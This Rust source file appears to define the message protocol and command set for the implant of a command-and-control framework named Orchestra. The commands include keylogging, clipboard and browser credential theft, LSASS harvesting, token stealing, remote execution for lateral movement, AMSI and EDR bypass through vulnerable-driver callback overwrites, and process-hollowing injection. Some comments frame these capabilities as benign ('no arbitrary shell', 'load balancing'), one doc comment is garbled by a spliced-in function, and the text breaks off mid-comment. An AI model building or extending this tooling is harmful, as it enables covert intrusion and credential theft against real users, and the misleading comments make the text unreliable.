//! Shared protocol, error, and cryptographic primitives for the Orchestra
//! console <-> agent channel.

use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use rand::RngCore;
use serde::{Deserialize, Serialize};
use sha2::Sha256;
use thiserror::Error;
use zeroize::Zeroize;

/// Length in bytes of the AES-256 key used by [`CryptoSession`].
pub const KEY_LEN: usize = 32;
/// Length in bytes of the HKDF salt prepended to each encrypted message.
pub const SALT_LEN: usize = 32;
/// Length in bytes of the AES-GCM nonce prepended to each ciphertext.
pub const NONCE_LEN: usize = 12;

/// Wire-protocol version for the agent ↔ server channel.
///
/// Bump this whenever a breaking change is made to the [`Message`] encoding or
/// the connection-establishment sequence.  The agent sends a
/// [`Message::VersionHandshake`] as its first message and refuses to proceed
/// if the server's echo carries a different version.
///
/// Version 2 prefixes encrypted payloads with a per-session HKDF salt:
/// `salt(32) || nonce(12) || ciphertext_with_tag`.
pub const PROTOCOL_VERSION: u32 = 2;

/// Audit event logging for operator actions and agent state changes.
pub mod audit;
/// Agent and server configuration structures (TOML deserialization).
pub mod config;
/// X25519 forward-secrecy key exchange for session establishment.
pub mod forward_secrecy;
/// Indicator-of-compromise detection and reporting.
pub mod ioc;
/// Transport-layer normalization (Base64, Mask XOR, Netbios encoding).
pub mod normalized_transport;
/// P2P mesh protocol message types and link management.
pub mod p2p_proto;
/// TLS transport configuration and certificate handling.
pub mod tls_transport;
/// Malleable C2 profile types shared between agent and server.
pub mod malleable_types;

pub use audit::{AuditEvent, Outcome};

/// Top-level wire message exchanged between a console and an agent.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Message {
    /// First message exchanged on every new connection.
    ///
    /// The agent sends this before the registration [`Heartbeat`]; the server
    /// echoes back its own version.  Either side SHOULD log a warning and MAY
    /// close the connection when the received version differs from
    /// [`PROTOCOL_VERSION`].
    VersionHandshake {
        version: u32,
    },
    Heartbeat {
        timestamp: u64,
        agent_id: String,
        status: String,
    },
    TaskRequest {
        task_id: String,
        command: Command,
        /// Identity of the operator who issued the command. Populated by the
        /// Control Center from the authenticated API session; agents use it
        /// to attribute `AuditEvent` records rather than defaulting to
        /// `"admin"`.  `None` means the request came directly from a
        /// console without an operator identity (e.g. integration tests).
        #[serde(default)]
        operator_id: Option<String>,
    },
    TaskResponse {
        task_id: String,
        result: Result<String, String>,
        /// Optional binary result data from `ExecutePluginBinary`.
        /// `None` for all other command responses.
        #[serde(default)]
        result_data: Option<Vec<u8>>,
    },
    /// Push a signed, AES-GCM-encrypted capability module to the agent.
    /// `encrypted_blob` is the same wire format produced by
    /// `CryptoSession::encrypt`.
    ModulePush {
        module_name: String,
        version: String,
        encrypted_blob: Vec<u8>,
    },
    /// Agent reports the SHA-256 hash of its `.text` section after a morph
    /// operation.  Sent both in response to `MorphNow` (carried in
    /// `TaskResponse.result`) and proactively after the initial check-in
    /// morph triggered by the server-supplied seed.
    MorphResult {
        connection_id: String,
        text_hash: String,
    },
    AuditLog(AuditEvent),
    Shutdown,
    /// Agent requests a capability module by ID.  The server locates the
    /// module file on disk, signs and encrypts it, and replies with a
    /// [`ModuleResponse`].  This replaces the legacy direct-HTTP download
    /// path (`reqwest::get`) so that module transfer is tunnelled through
    /// the encrypted C2 channel.
    ModuleRequest {
        module_id: String,
    },
    /// Server delivers a signed, AES-GCM-encrypted module to the agent in
    /// response to a [`ModuleRequest`].  The `encrypted_blob` has the same
    /// wire format as [`ModulePush::encrypted_blob`] and can be fed directly
    /// to `module_loader::load_plugin`.
    ModuleResponse {
        module_id: String,
        encrypted_blob: Vec<u8>,
    },
    /// P2P mesh: a parent agent forwards C2 traffic on behalf of a child.
    ///
    /// `child_link_id` identifies the originating child in the parent's link
    /// table so the server can route the response back to the correct child.
    /// `data` is the **plaintext** C2 payload (e.g. a serialized
    /// `TaskResponse`) that the child intended for the server.  The C2
    /// transport layer encrypts the entire `Message` (including this variant)
    /// with the parent's AES-256-GCM session key before transmission, so
    /// `data` is encrypted in transit without requiring a separate encryption
    /// step.
    P2pForward {
        child_link_id: u32,
        data: Vec<u8>,
    },
    /// P2P mesh: the server sends C2 traffic addressed to a specific child
    /// through its parent.  The parent looks up `child_link_id` in its link
    /// table, re-encrypts `data` with the child's per-link ChaCha20-Poly1305
    /// key, and forwards it as a `DataForward` P2P frame.
    P2pToChild {
        child_link_id: u32,
        data: Vec<u8>,
    },
    /// P2P mesh topology report.  Sent periodically by each agent to its
    /// parent (or directly to the server if the agent has no parent).
    /// Contains the agent's current set of child links so the server can
    /// maintain a full mesh topology map.
    P2pTopologyReport {
        agent_id: String,
        children: Vec<P2pChildInfo>,
    },
    /// P2P mesh link failure report.  Sent by an agent to the server when
    /// a P2P link transitions to `Dead` state.  Contains quality metrics
    /// captured at the time of failure for server-side mesh monitoring.
    P2pLinkFailureReport {
        agent_id: String,
        dead_peer_id: String,
        link_type: u8,
        uptime_secs: u64,
        latency_ms: u32,
        packet_loss: f32,
        bandwidth_bps: u64,
    },
    /// Enhanced P2P mesh topology report.  Sent every 120 seconds by each
    /// agent, includes all connected peers (parent/child/lateral) with
    /// link quality metrics and a routing table summary.
    P2pEnhancedTopologyReport {
        agent_id: String,
        /// All connected peers with link type and quality.
        peers: Vec<P2pPeerInfo>,
        /// Reachable destinations with hop counts.
        routes: Vec<P2pRouteInfo>,
    },
    /// A mesh-routed frame exceeded the maximum relay depth.  Sent by
    /// the detecting agent back toward the origin (or server).
    P2pRouteTooDeep {
        destination: String,
        origin: String,
        hop_count: u8,
    },
    /// Server delivers a mesh certificate to the agent during check-in or
    /// renewal.  The agent stores this certificate and presents it during
    /// every P2P link handshake.
    MeshCertificateIssuance {
        certificate: MeshCertificate,
    },
    /// Agent requests a mesh certificate renewal from the server (typically
    /// 2 hours before expiry).
    MeshCertificateRenewal,
    /// Server broadcasts a certificate revocation to all agents.  Every agent
    /// checks its active links and terminates any connection to the revoked peer.
    MeshCertificateRevocation {
        revoked_agent_id_hash: [u8; 32],
    },
    /// Agent reports to the server that a peer has been quarantined due to
    /// suspicious behaviour (invalid cert, compromise indicators, etc.).
    MeshQuarantineReport {
        quarantined_agent_id_hash: [u8; 32],
        reason: u8,
        evidence_hash: [u8; 32],
    },
    /// Interactive shell output — an asynchronous event sent by the agent's
    /// background reader thread whenever a shell session produces stdout or
    /// stderr data.  Unlike `TaskResponse`, this is not correlated to a
    /// specific task ID; it streams continuously until the shell session
    /// is closed.  The server forwards these events to the operator's
    /// console in real-time.
    ShellOutput {
        /// The session that produced this output.
        session_id: u32,
        /// UTF-8 text (lossy-decoded from raw bytes).
        data: String,
        /// Which stream the data came from.
        stream: ShellStream,
    },
}

/// Which stream a [`Message::ShellOutput`] event came from.
#[derive(Serialize, Deserialize, Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u8)]
pub enum ShellStream {
    /// Standard output.
    Stdout = 0,
    /// Standard error.
    Stderr = 1,
}

/// Metadata returned when a shell session is created or listed.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ShellInfo {
    /// Unique session identifier (monotonically increasing).
    pub session_id: u32,
    /// Shell type (e.g. "cmd.exe", "/bin/sh").
    pub shell_type: String,
    /// Epoch timestamp (seconds) when the session was created.
    pub created_at: u64,
    /// Process ID of the child shell.
    pub pid: u32,
}

/// A single child entry in a [`Message::P2pTopologyReport`].
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct P2pChildInfo {
    pub link_id: u32,
    pub agent_id: String,
}

/// A single peer entry in a [`Message::P2pEnhancedTopologyReport`].
/// Contains the peer's agent_id, link type, quality score, and latency.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct P2pPeerInfo {
    pub peer_id: String,
    /// 0=parent, 1=child, 2=peer (lateral).
    pub link_type: u8,
    /// Composite quality score (0.0–1.0).
    pub quality: f32,
    /// Last measured latency in milliseconds.
    pub latency_ms: u32,
}

/// A routing summary entry in a [`Message::P2pEnhancedTopologyReport`].
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct P2pRouteInfo {
    pub destination: String,
    pub hop_count: u8,
}

/// A mesh certificate issued by the Orchestra server, used for P2P link
/// authentication.  Each agent receives a certificate during check-in and
/// presents it during the P2P handshake.  The Ed25519 signature is computed
/// over the concatenation:
///
/// ```text
/// agent_id_hash(32) || public_key(32) || issued_at_le(8) || expires_at_le(8)
/// ```
///
/// Optional compartment tag restricts peer links to agents in the same
/// compartment.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct MeshCertificate {
    /// SHA-256 hash of the agent's `agent_id` string (used for revocation
    /// lookups without revealing the plaintext ID on the wire).
    pub agent_id_hash: [u8; 32],
    /// The agent's long-term Ed25519 public key for link authentication.
    pub public_key: [u8; 32],
    /// Unix timestamp (seconds) when the certificate was issued.
    pub issued_at: u64,
    /// Unix timestamp (seconds) when the certificate expires.
    pub expires_at: u64,
    /// Ed25519 signature over the certificate body, produced by the server's
    /// `module_signing_key`.
    #[serde(
        serialize_with = "serialize_sig_64",
        deserialize_with = "deserialize_sig_64"
    )]
    pub server_signature: [u8; 64],
    /// Optional mesh compartment identifier.  When set, the agent may only
    /// establish peer links with agents in the same compartment.
    #[serde(default)]
    pub compartment: Option<String>,
}

/// Serde helper: serialize a 64-byte Ed25519 signature as a byte array.
fn serialize_sig_64<S: serde::Serializer>(sig: &[u8; 64], s: S) -> Result<S::Ok, S::Error> {
    s.serialize_bytes(sig)
}

/// Serde helper: deserialize a 64-byte Ed25519 signature from a byte array.
fn deserialize_sig_64<'de, D: serde::Deserializer<'de>>(d: D) -> Result<[u8; 64], D::Error> {
    struct SigVisitor;
    impl<'de> serde::de::Visitor<'de> for SigVisitor {
        type Value = [u8; 64];
        fn expecting(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
            f.write_str("a 64-byte signature")
        }
        fn visit_bytes<E: serde::de::Error>(self, v: &[u8]) -> Result<Self::Value, E> {
            v.try_into().map_err(|_| E::invalid_length(v.len(), &self))
        }
        fn visit_seq<A: serde::de::SeqAccess<'de>>(self, mut seq: A) -> Result<Self::Value, A::Error> {
            let mut buf = [0u8; 64];
            for (i, slot) in buf.iter_mut().enumerate() {
                *slot = seq.next_element()?.ok_or_else(|| {
                    serde::de::Error::invalid_length(i, &self)
                })?;
            }
            Ok(buf)
        }
    }
    d.deserialize_bytes(SigVisitor)
}

impl MeshCertificate {
    /// Return the canonical byte buffer that is signed / verified:
    /// `agent_id_hash || public_key || issued_at_le || expires_at_le`.
    pub fn signing_input(&self) -> Vec<u8> {
        let mut buf = Vec::with_capacity(32 + 32 + 8 + 8);
        buf.extend_from_slice(&self.agent_id_hash);
        buf.extend_from_slice(&self.public_key);
        buf.extend_from_slice(&self.issued_at.to_le_bytes());
        buf.extend_from_slice(&self.expires_at.to_le_bytes());
        buf
    }

    /// Check whether the certificate has expired relative to `now` (Unix ts).
    pub fn is_expired(&self, now: u64) -> bool {
        now >= self.expires_at
    }

    /// Check whether the certificate is within the renewal window.
    pub fn needs_renewal(&self, now: u64) -> bool {
        let renewal_threshold = self
            .expires_at
            .saturating_sub(crate::p2p_proto::MESH_CERT_RENEWAL_SECS);
        now >= renewal_threshold
    }
}

/// Compute the SHA-256 hash of an agent_id string (used for revocation and
/// certificate identity).
pub fn hash_agent_id(agent_id: &str) -> [u8; 32] {
    use sha2::Digest;
    let mut hasher = Sha256::new();
    hasher.update(agent_id.as_bytes());
    hasher.finalize().into()
}

/// Verify a mesh certificate's Ed25519 signature and expiry.
///
/// Returns `Ok(())` if the signature is valid and the certificate has not
/// expired relative to `now` (Unix timestamp in seconds).  Returns `Err`
/// with a human-readable description otherwise.
///
/// This function is only available when the `module-signatures` feature is
/// enabled (which pulls in `ed25519-dalek`).
#[cfg(feature = "module-signatures")]
pub fn verify_mesh_certificate(
    cert: &MeshCertificate,
    server_public_key: &[u8; 32],
    now: u64,
) -> Result<(), String> {
    use ed25519_dalek::{Signature, Verifier, VerifyingKey};

    // Check expiry first.
    if cert.is_expired(now) {
        return Err("mesh certificate has expired".to_string());
    }

    // Verify the agent_id_hash matches — this is a sanity check ensuring
    // the cert struct is internally consistent.
    // (The caller typically already knows the agent_id and can verify separately.)

    // Reconstruct the Ed25519 verifying key from bytes.
    let verifying_key = VerifyingKey::from_bytes(server_public_key)
        .map_err(|e| format!("invalid server public key: {e}"))?;

    // Reconstruct the signature from bytes.
    let signature = Signature::from_bytes(&cert.server_signature);

    // Verify the signature over the canonical signing input.
    verifying_key
        .verify(&cert.signing_input(), &signature)
        .map_err(|e| format!("mesh certificate signature verification failed: {e}"))?;

    Ok(())
}

/// Configuration for export forwarding in a side-loaded DLL.
///
/// Used by both build-time tools (e.g. `orchestra-side-load-gen`) to generate
/// DLLs with legitimate-looking export tables, and at runtime by the agent's
/// `inject_with_export_forwarding` path to perform OPSEC-safe injection that
/// produces a side-loaded DLL with a legitimate export table in memory.
#[derive(Serialize, Deserialize, Debug, Clone, Default, PartialEq)]
pub struct ExportConfig {
    /// Name of the real DLL to forward exports to (e.g. `"version.dll"`).
    pub forward_target: String,
    /// Named exports to forward (e.g. `["GetFileVersionInfoA"]`).
    pub named_exports: Vec<String>,
    /// Ordinal-only exports: `(ordinal, internal_name)`.
    pub ordinal_exports: Vec<(u16, String)>,
}

/// A single sandbox/VM detection indicator produced by the scoring pipeline.
///
/// Each indicator represents one piece of evidence gathered during the
/// sandbox detection sweep.  Indicators carry a weight that is summed to
/// produce the overall sandbox score.
#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub struct SandboxIndicator {
    /// High-level category of the indicator (e.g. `"hypervisor"`,
    /// `"cloud_bios"`, `"timing"`, `"debugger"`, `"mac_prefix"`).
    pub category: String,
    /// Human-readable description of what was detected (e.g.
    /// `"VMware BIOS detected"`).
    pub detail: String,
    /// Weight contributed to the overall sandbox score.  Higher weights
    /// indicate stronger signals.
    pub weight: u32,
    /// How the indicator was obtained (e.g. `"registry"`, `"cpuid"`,
    /// `"mac_prefix"`, `"timing"`, `"peb"`).
    pub source: String,
}

/// The set of administrator-approved actions the agent is willing to perform.
///
/// The protocol intentionally does **not** expose an "execute arbitrary shell
/// Helper for serde default on `bool` fields that should default to `true`.
fn default_true() -> bool {
    true
}

/// command" variant. Scripts must be pre-registered on the endpoint and are
/// referenced by name via [`Command::RunApprovedScript`].
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Command {
    Ping,
    GetSystemInfo,
    /// Run a script that has been pre-registered with the agent. `script` is
    /// the registered identifier, **not** an arbitrary command line.
    RunApprovedScript {
        script: String,
    },
    ListDirectory {
        path: String,
    },
    ReadFile {
        path: String,
    },
    WriteFile {
        path: String,
        content: Vec<u8>,
    },
    DeployModule {
        module_id: String,
    },
    ExecutePlugin {
        plugin_id: String,
        args: String,
    },
    Shutdown,
    DiscoverNetwork,
    /// Full network discovery suite (P3-01).  The operation enum selects
    /// one of the five discovery functions in `net_discovery`.
    NetworkDiscovery {
        operation: NetDiscoveryOp,
    },
    CaptureScreen,
    SimulateKey {
        key: String,
    },
    SimulateMouse {
        x: i32,
        y: i32,
    },
    StartHciLogging,
    StopHciLogging,
    GetHciLogBuffer,
    ReloadConfig,
    /// Install the opt-in persistence service (systemd unit / scheduled task).
    EnablePersistence,
    /// Remove the persistence service installed by `EnablePersistence`.
    DisablePersistence,
    /// Move the agent into the address space of `target_pid` for load
    /// balancing or resource consolidation.
    MigrateAgent {
        target_pid: u32,
    },
    /// Return a JSON-serialized snapshot of running processes.
    ListProcesses,
    /// Set the seed used for periodic self-re-encoding of the agent's own
    /// `.text` section.  The seed is combined with a timestamp to derive a
    /// unique transformation on each re-encoding pass.  Only effective when
    /// the `self-reencode` feature is compiled in.
    SetReencodeSeed {
        seed: u64,
    },
    /// Immediately re-encode the agent's `.text` section with the supplied
    /// seed and report a SHA-256 hash of the new `.text` section back to
    /// the server.  Unlike `SetReencodeSeed` (which only stores the seed for
    /// the next periodic cycle), `MorphNow` triggers a synchronous
    /// transformation and returns the resulting hash in the `TaskResponse`.
    MorphNow {
        seed: u64,
    },
    /// Switch the sleep obfuscation variant at runtime.  Accepted values:
    /// `"cronus"` (waitable-timer-based) or `"ekko"` (NtDelayExecution-based).
    /// The change takes effect on the next sleep cycle.
    SetSleepVariant {
        variant: String,
    },
    /// Return a JSON array of metadata for all loaded plugins.
    ListPlugins,
    /// Remove a plugin from the loaded-plugin registry and release its resources.
    UnloadPlugin {
        plugin_id: String,
    },
    /// Return the full `PluginMetadata` for a specific loaded plugin.
    GetPluginInfo {
        plugin_id: String,
    },
    /// Download a module from the configured `module_repo_url` or a specified
    /// URL, store it in the cache directory, and optionally load it.
    DownloadModule {
        module_id: String,
        repo_url: Option<String>,
    },
    /// Execute a loaded plugin using the binary I/O path.  Returns raw bytes
    /// via `TaskResponse.result_data`.
    ExecutePluginBinary {
        plugin_id: String,
        input_data: Vec<u8>,
    },
    /// Query the status of an asynchronous plugin job.
    JobStatus {
        job_id: String,
    },

    // ── Token Manipulation (Windows only) ───────────────────────────────

    /// Create a new logon session with the provided credentials.
    /// Returns the new session's token handle information on success.
    MakeToken {
        username: String,
        password: String,
        domain: String,
        logon_type: u32,
    },
    /// Duplicate an existing process token via `OpenProcessToken` +
    /// `DuplicateTokenEx` and begin impersonating it.
    StealToken {
        target_pid: u32,
    },
    /// Revert to the original process token (undo `StealToken` / `MakeToken`).
    Rev2Self,
    /// Elevate to SYSTEM privileges via token impersonation (steal from a
    /// SYSTEM-owned process such as `winlogon.exe` or `lsass.exe`).
    GetSystem,

    // ── Lateral Movement (Windows only) ─────────────────────────────────

    /// Execute a command on a remote host via PsExec-style service creation.
    PsExec {
        target_host: String,
        command: String,
        username: Option<String>,
        password: Option<String>,
    },
    /// Execute a command on a remote host via WMI `IWbemServices`.
    WmiExec {
        target_host: String,
        command: String,
        username: Option<String>,
        password: Option<String>,
    },
    /// Execute a command on a remote host via DCOM (`ShellWindows` /
    /// `ShellBrowserWindow` COM object).
    DcomExec {
        target_host: String,
        command: String,
        username: Option<String>,
        password: Option<String>,
    },
    /// Execute a command on a remote host via WinRM SOAP requests.
    WinRmExec {
        target_host: String,
        command: String,
        username: Option<String>,
        password: Option<String>,
    },
    // ── P2P mesh management ────────────────────────────────────────────────
    /// Instruct a child agent to establish a P2P link to a parent agent.
    LinkAgents {
        parent_agent_id: String,
        child_agent_id: String,
        /// Transport to use: `"smb"` or `"tcp"`.
        transport: String,
        /// Target address for TCP links (host:port).  Ignored for SMB.
        #[serde(default)]
        target_addr: String,
    },
    /// Instruct an agent to disconnect from its P2P parent.
    UnlinkAgent {
        agent_id: String,
    },
    /// Return the full P2P mesh topology visible to this agent.
    ListTopology,
    // ── Agent-side P2P link management ─────────────────────────────────────
    /// Connect to a parent agent at the given address using the specified
    /// transport (`"tcp"` or `"smb"`).
    LinkTo {
        parent_addr: String,
        transport: String,
    },
    /// Disconnect from a P2P link.  `None` means disconnect from all links.
    Unlink {
        link_id: Option<u32>,
    },
    /// Report the current P2P links on this agent.
    ListLinks,
    // ── Mesh controller commands ───────────────────────────────────────────
    /// Tell agent A to establish a peer link with agent B.
    MeshConnect {
        target_agent_id: String,
        transport: String,
        target_addr: String,
    },
    /// Tell agent A to close its link with agent B.
    MeshDisconnect {
        target_agent_id: String,
    },
    /// Emergency kill switch: terminate ALL P2P links immediately, purge the
    /// mesh routing table, and refuse new links until cleared.  Sent by the
    /// server when a severe compromise is detected.
    MeshKillSwitch,
    /// Operator-initiated quarantine: the agent must immediately terminate
    /// any link to the specified peer, mark it as quarantined, and refuse
    /// future connections from it.
    MeshQuarantine {
        target_agent_id: String,
        /// Reason code (see `common::p2p_proto::quarantine_reason`).
        reason: u8,
    },
    /// Clear the quarantine flag for an agent, allowing it to reconnect.
    MeshClearQuarantine {
        target_agent_id: String,
    },
    /// Set or change the mesh compartment for this agent.  Affects which
    /// peers are allowed for new link establishment.
    MeshSetCompartment {
        compartment: String,
    },

    // ── In-process .NET assembly execution (Windows only) ──────────────────
    /// Load and execute a .NET assembly entirely in-process using the CLR
    /// hosting APIs (ICLRMetaHost → ICLRRuntimeHost).  Equivalent to
    /// Cobalt Strike's `execute-assembly`.  The assembly bytes must be a
    /// valid .NET PE (managed DLL or EXE).  Output is captured via pipe
    /// redirection and returned as UTF-8 text.
    ExecuteAssembly {
        /// Raw bytes of the .NET assembly (PE/COFF with CLR header).
        data: Vec<u8>,
        /// Command-line arguments passed to the assembly entry point.
        #[serde(default)]
        args: Vec<String>,
        /// Optional wall-clock timeout in seconds.  If the assembly does
        /// not return within this period the CLR thread is terminated.
        /// `None` means use a default (30 s).
        #[serde(default)]
        timeout_secs: Option<u64>,
    },

    // ── BOF / COFF loader (Windows only) ───────────────────────────────────
    /// Execute a Beacon Object File (BOF) / COFF object file in-process.
    /// Compatible with the public BOF ecosystem (trustedsec, CCob, etc.).
    /// The COFF bytes must contain a `go` entry-point symbol.  External
    /// symbols are resolved via the Beacon-compatible API (`DLL$Function`
    /// pattern).  Output is captured via the BeaconOutput callback and
    /// returned as UTF-8 text.
    ExecuteBOF {
        /// Raw bytes of the COFF object file (`.o` / `.obj`).
        data: Vec<u8>,
        /// Arguments packed as length-prefixed blobs and passed to the
        /// `go(char* args, int len)` entry point.
        #[serde(default)]
        args: Vec<String>,
        /// Optional wall-clock timeout in seconds.  If the BOF does not
        /// return within this period the execution thread is terminated.
        /// `None` means use a default (60 s).
        #[serde(default)]
        timeout_secs: Option<u64>,
    },

    // ── Interactive shell sessions ──────────────────────────────────────
    /// Create a new interactive shell session.  Spawns a child process
    /// (cmd.exe, /bin/sh, or a custom shell) with piped stdin/stdout/stderr.
    /// A background reader thread streams output asynchronously via
    /// [`Message::ShellOutput`].
    CreateShell {
        /// Optional path to the shell binary.  `None` uses the platform
        /// default (`cmd.exe` on Windows, `/bin/sh` on Unix).
        #[serde(default)]
        shell_path: Option<String>,
    },
    /// Send input to an active shell session's stdin pipe.
    ShellInput {
        /// The session to send input to.
        session_id: u32,
        /// The text to write.  A newline is appended automatically if not
        /// present.
        data: String,
    },
    /// Close and clean up a shell session (terminate process, close pipes,
    /// stop reader thread).
    ShellClose {
        /// The session to close.
        session_id: u32,
    },
    /// List all active shell sessions with their metadata.
    ShellList,
    /// Resize the pseudo-terminal for a shell session (no-op on Windows
    /// cmd.exe; sets TTY window size on Unix).
    ShellResize {
        /// The session to resize.
        session_id: u32,
        /// Terminal width in columns.
        cols: u16,
        /// Terminal height in rows.
        rows: u16,
    },

    // ── Surveillance ────────────────────────────────────────────────────

    /// Capture a screenshot of the specified monitor (or primary if `None`).
    /// Returns base64-encoded PNG bytes in the task response.
    Screenshot {
        /// Monitor index.  `None` captures the primary display.
        #[serde(default)]
        monitor: Option<u32>,
    },
    /// Start the keylogger.  Keystrokes are buffered in an encrypted ring
    /// buffer and can be retrieved with `KeyloggerDump`.
    KeyloggerStart,
    /// Dump the encrypted keylogger buffer.  Returns `nonce(12) || ciphertext`
    /// containing the recorded keystroke entries.
    KeyloggerDump {
        /// If true, clear the buffer after reading.
        #[serde(default)]
        clear: bool,
    },
    /// Stop the keylogger and release the keyboard hook.
    KeyloggerStop,
    /// Start monitoring the clipboard for changes.  Clipboard content
    /// snapshots are buffered in an encrypted ring buffer.
    ClipboardMonitorStart {
        /// Polling interval in milliseconds.  `None` uses the default (1 000 ms).
        #[serde(default)]
        interval_ms: Option<u64>,
    },
    /// Dump the encrypted clipboard monitor buffer.
    ClipboardMonitorDump {
        /// If true, clear the buffer after reading.
        #[serde(default)]
        clear: bool,
    },
    /// Stop the clipboard monitor.
    ClipboardMonitorStop,
    /// Perform a one-shot clipboard read.  Returns the current clipboard
    /// text as a UTF-8 string.
    ClipboardGet,

    // ── Browser stored-data recovery (Windows) ─────────────────────────

    /// Recover stored credentials and/or cookies from installed browsers.
    /// Windows-only; handled by the `browser-data` feature.
    /// Returns a JSON-encoded `BrowserDataResult` in the response payload.
    BrowserData {
        /// Which browser(s) to target.  `None` defaults to `BrowserType::All`.
        #[serde(default)]
        browser: Option<BrowserType>,
        /// Which data category to collect.
        data_type: BrowserDataType,
    },

    // ── LSASS credential harvesting (Windows only) ──────────────────────

    /// Harvest credentials from LSASS process memory via incremental reading
    /// and in-process parsing.  No dump file is created on disk.  Returns a
    /// JSON-encoded credential list containing MSV (NT hashes), WDigest
    /// (plaintext), Kerberos tickets, DPAPI backup keys, and DCC2 hashes.
    HarvestLSASS,

    // ── LSA Whisperer — SSP interface credential extraction (Windows) ─

    /// Extract credentials by interacting with LSA authentication packages
    /// (SSPs) through their documented interfaces.  Operates entirely within
    /// the LSA process's own security context without reading LSASS memory.
    /// Bypasses Credential Guard and RunAsPPL.  Three methods:
    /// - `Untrusted`: LsaConnectUntrusted (no admin required)
    /// - `SspInject`: Inject custom SSP to capture future logons (admin)
    /// - `Auto`: Try SspInject if elevated, else Untrusted
    HarvestLSA {
        method: LsaMethod,
    },

    /// Return a JSON status snapshot of the LSA Whisperer subsystem:
    /// active method, credentials buffered, SSP injection state, etc.
    LSAWhispererStatus,

    /// Stop the LSA Whisperer: cancel any in-progress SSP enumeration,
    /// unload injected SSP (if any), and clear the credential buffer.
    LSAWhispererStop,

    // ── NTDLL unhooking (Windows) ──────────────────────────────────────

    /// Re-fetch a clean copy of ntdll.dll from \KnownDlls (or disk fallback)
    /// and overlay the .text section onto the in-memory (potentially hooked)
    /// ntdll.  This is the fallback when Halo's Gate fails (all adjacent
    /// syscall stubs are hooked).  Also callable on-demand by the operator.
    UnhookNtdll,

    // ── AMSI bypass mode selection (Windows) ───────────────────────────

    /// Switch the active AMSI bypass strategy at runtime.  The agent will
    /// disable any running bypass and activate the selected one.
    AmsiBypassMode {
        mode: AmsiBypassMode,
    },

    // ── Evanesco continuous memory hiding (Windows) ────────────────────

    /// Return a JSON status snapshot of the Evanesco page-tracker subsystem:
    /// number of tracked pages, current counts by state (encrypted / decrypted),
    /// idle threshold, scan interval, and total encrypt/decrypt call counts.
    /// Only available when the `evanesco` feature is compiled in.
    EvanescoStatus,
    /// Dynamically adjust the idle threshold (in milliseconds) for the
    /// Evanesco background re-encryption thread.  Pages idle longer than
    /// this value are re-encrypted to `PAGE_NOACCESS`.
    EvanescoSetThreshold {
        idle_ms: u64,
    },

    // ── Kernel callback overwrite (BYOVD, Windows only) ───────────────

    /// Discover and report all registered EDR kernel callbacks: process
    /// creation, thread creation, image load, and object manager callbacks.
    /// Returns a JSON array of discovered callbacks with module, address,
    /// and callback block information.
    KernelCallbackScan,

    /// Deploy a vulnerable signed driver (BYOVD), locate EDR kernel callbacks,
    /// and surgically overwrite their function pointers to point to a `ret`
    /// instruction.  The pointer remains non-NULL, defeating EDR integrity
    /// checks, but the callback immediately returns without executing.
    /// Optional `drivers` list restricts which vulnerable drivers to attempt;
    /// empty vector means try all embedded drivers.
    KernelCallbackNuke {
        #[serde(default)]
        drivers: Vec<String>,
    },

    /// Restore all previously overwritten kernel callback pointers to their
    /// original values (from the saved backup).  Requires a prior successful
    /// `KernelCallbackNuke` operation in the current session.
    KernelCallbackRestore,

    // ── EDR bypass transformation engine ────────────────────────────────

    /// Scan the agent's own `.text` section for byte signatures known to be
    /// detected by EDR (YARA rules, entropy heuristics, known gadget chains
    /// like direct syscall stubs).  Returns a JSON array of `SignatureHit`
    /// objects describing each detected pattern with offset, signature name,
    /// and surrounding context bytes.
    EvasionTransformScan,

    /// Run one cycle of the automated EDR bypass transformation engine.
    /// Scans `.text` for known signatures and applies up to
    /// `max_transforms_per_cycle` semantic-preserving transformations
    /// (instruction substitution, register reassignment, nop sled insertion,
    /// constant splitting, jump obfuscation).  Returns a JSON summary of
    /// applied transforms with before/after hashes for verification.
    EvasionTransformRun,

    /// Perform NTFS transaction-based process hollowing injection.
    /// Creates an NTFS transaction, creates a section backed by the
    /// transaction, writes the payload into a suspended target process,
    /// then rolls back the transaction so the on-disk file never existed.
    /// The section mapping in the target process remains valid.
    /// Includes ETW blinding with spoofed provider GUIDs.
    /// Returns `InjectionResult` on success.
    TransactedHollow {
        /// Process name to inject into (e.g. `"svchost.exe"`).
        target_process: String,
        /// Shellcode or PE payload bytes.
        payload: Vec<u8>,
        /// Whether to perform ETW blinding before injection.
        etw_blinding: bool,
    },

    /// Delayed module-stomp injection: load a sacrificial DLL into the
    /// target process, wait for the EDR initial-scan window to pass,
    /// then overwrite the DLL's `.text` section with the payload.
    /// The delay (8–15 seconds randomized by default) defeats timing-
    /// based EDR heuristics that flag modules whose code changes shortly
    /// after loading.  Phase 1 (load) returns immediately; Phase 2
    /// (stomp + execute) fires after the delay.
    /// Returns a phase-1 acknowledgement immediately, then a second
    /// `InjectionResult` when phase 2 completes.
    DelayedStomp {
        /// Target process ID.
        target_pid: u32,
        /// Shellcode or PE payload bytes.
        payload: Vec<u8>,
        /// Optional override for the delay in seconds (uses config default if `None`).
        delay_secs: Option<u32>,
    },

    /// DLL side-load injection with export forwarding.  Decrypts the payload
    /// (same as `DllSideLoad`), opens the target process, resolves the forward
    /// target DLL in the target process via PEB module walk, allocates memory
    /// for the payload near the forward target, patches the payload's export
    /// table entries to point to the real function addresses, and executes
    /// via `NtCreateThreadEx`.  This produces a side-loaded DLL with a
    /// legitimate export table in memory — a more OPSEC-safe path than
    /// the basic `DllSideLoad` injector.
    InjectSideLoad {
        /// Target process ID.
        pid: u32,
        /// XChaCha20-Poly1305 encrypted payload blob.
        payload: Vec<u8>,
        /// Export forwarding configuration.
        export_config: ExportConfig,
    },

    /// Unified injection via the injection engine.  Supports all 12
    /// technique variants with automatic technique selection, EDR
    /// reconnaissance, and fallback chains.  When `technique` is `None`
    /// the engine auto-selects the stealthiest technique for the target
    /// process.  When `technique` is specified, the engine uses it but
